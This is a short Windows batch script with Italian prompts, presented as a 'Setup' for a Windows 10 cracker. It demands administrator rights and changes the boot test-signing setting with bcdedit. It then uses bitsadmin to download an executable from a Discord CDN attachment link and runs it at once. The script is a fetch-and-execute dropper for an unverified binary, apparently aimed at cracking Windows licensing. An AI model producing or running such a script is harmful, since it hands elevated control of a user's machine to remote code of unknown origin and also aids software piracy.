@echo off
color c
title Setup - Crediti: Calabrese#0001
net session >nul 2>&1
if %errorLevel% == 0 (
    echo Programma aperto come amministratore! Continuando...
    goto continua
) else (
    echo Devi avviare il programma come amministratore!
    goto fine
)

:continua
cls
bcdedit -set TESTSIGNING OFF
cd C:\Users\%USERNAME%\Downloads
mkdir Windows-Cracker-Github
bitsadmin.exe /transfer "Attendi qualche secondo" https://cdn.discordapp.com/attachments/653666644689682462/964184459933011988/windows10cracker.exe C:\Users\%USERNAME%\Downloads\Windows-Cracker-Github\windows10cracker.exe
cd Windows-Cracker-Github
cls
windows10cracker.exe

:fine
pause
